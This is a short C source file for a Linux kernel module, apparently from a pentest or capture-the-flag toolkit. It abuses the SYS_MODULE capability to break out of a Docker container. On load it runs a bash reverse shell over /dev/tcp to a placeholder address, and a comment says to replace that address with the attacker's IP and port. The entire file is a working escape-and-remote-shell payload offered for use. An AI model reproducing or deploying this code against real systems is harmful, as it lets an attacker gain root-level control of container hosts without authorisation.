/**********************************************************************/
/* Kernel to exploit SYS_MODULE capability on Docker container
/* Powered by AkuSec Team
/* To enable module in kernel : insmod reverse_shell.ko
/*********************************************************************/

#include <linux/kmod.h>
#include <linux/module.h>

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/127.0.0.1/1234 0>&1", NULL}; //change your IP and port here

static char* envp[] = {
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL
};

static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exit program...\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
